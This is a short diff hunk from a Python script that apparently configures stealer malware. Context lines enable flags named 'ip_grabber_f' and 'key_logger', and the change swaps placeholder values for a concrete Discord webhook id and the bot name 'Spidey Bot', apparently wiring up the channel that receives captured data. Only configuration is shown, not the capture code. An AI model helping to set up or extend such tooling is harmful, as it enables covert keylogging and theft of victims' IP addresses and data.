@@ -20,7 +20,7 @@ ip_grabber_f = True
 key_logger = True
 today = date.today()
 
-ext = {"webhook-id": "ChangeMe", "webhook-name": "ChangeMe"}
+ext = {"webhook-id": "1078600770745798756", "webhook-name": "Spidey Bot"}
 
 os.system('title TITLE OF THE APP')
 
